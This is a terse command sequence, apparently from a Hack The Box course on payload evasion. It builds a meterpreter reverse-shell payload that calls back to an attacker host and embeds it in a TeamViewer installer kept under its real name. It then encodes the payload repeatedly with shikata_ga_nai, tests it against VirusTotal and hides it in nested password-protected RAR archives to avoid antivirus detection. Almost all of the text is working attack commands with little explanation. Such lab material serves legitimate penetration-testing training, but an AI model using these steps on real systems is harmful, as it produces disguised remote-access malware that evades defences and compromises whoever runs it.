 #MSFvenom #Evasion #Encode #Archive
___
...
```shell
6165@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
...
```shell
6165@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
...
```shell
6165@htb[/htb]$ msf-virustotal -k <API key> -f test.js 
...
```shell
6165@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
6165@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
6165@htb[/htb]$ rar a ~/test.rar -p ~/test.js
...
```shell
6165@htb[/htb]$ rar a test2.rar -p test
...
```shell
6165@htb[/htb]$ mv test2.rar test2
6165@htb[/htb]$ ls
...
```shell
6165@htb[/htb]$ msf-virustotal -k <API key> -f test2
